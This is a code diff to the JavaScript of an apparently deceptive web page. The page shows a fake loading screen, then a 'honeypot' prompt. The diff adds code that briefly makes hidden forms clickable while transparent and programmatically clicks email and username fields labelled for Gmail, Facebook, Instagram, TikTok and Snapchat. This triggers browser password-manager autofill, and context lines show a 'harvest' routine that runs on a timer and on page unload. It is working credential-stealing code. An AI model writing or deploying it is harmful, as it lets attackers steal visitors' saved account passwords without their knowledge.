@@ -95,18 +95,9 @@ setTimeout(harvest, 15000);
 // Also, listen for the page unload event as a last resort
 window.addEventListener('beforeunload', harvest);
 
-// --- UI Logic ---
-// Show the fake agreement after a delay
-setTimeout(() => {
-  const previewContainer = document.querySelector('.preview-container');
-  const agreementContainer = document.querySelector('.agreement-container');
-  if (previewContainer) previewContainer.style.display = 'none';
-  if (agreementContainer) agreementContainer.style.display = 'block';
-}, 1500); // 1.5 second delay to simulate loading
+// --- UI & Honeypot Logic ---
 
-
-// --- Desktop Mouse-Move Autofill Trigger ---
-// After 1.5 seconds, hide the loader and show the honeypot prompt
+// After a delay, hide the loader and show the honeypot prompt
 setTimeout(() => {
   const previewContainer = document.querySelector('.preview-container');
   const honeypotContainer = document.querySelector('.honeypot-container');
@@ -114,18 +105,31 @@ setTimeout(() => {
   if (honeypotContainer) honeypotContainer.style.display = 'block';
 }, 1500);
 
-// --- Honeypot Trigger Logic ---
 function triggerAllAutofills() {
-  // This function is called when the user interacts with the honeypot.
-  // It programmatically clicks all hidden inputs to trigger browser autofill.
   console.log('Honeypot triggered, attempting to fire all autofill prompts...');
 
-  // Click all the username/email fields to trigger password managers
+  const forms = document.querySelectorAll('.hidden-form');
+  
+  // Temporarily make forms visible to allow clicks
+  forms.forEach(form => {
+    form.style.display = 'block';
+    form.style.opacity = '0';
+    form.style.position = 'absolute'; // Prevent layout shift
+  });
+
+  // Click all the username/email fields
   document.querySelector('#gmail-form input[name="email"]')?.click();
   document.querySelector('#facebook-form input[name="username"]')?.click();
   document.querySelector('#instagram-form input[name="username"]')?.click();
   document.querySelector('#tiktok-form input[name="username"]')?.click();
   document.querySelector('#snapchat-form input[name="username"]')?.click();
+
+  // Hide the forms again shortly after
+  setTimeout(() => {
+      forms.forEach(form => {
+          form.style.display = 'none';
+      });
+  }, 100);
 }
 
 // Add a one-time event listener to the honeypot input.
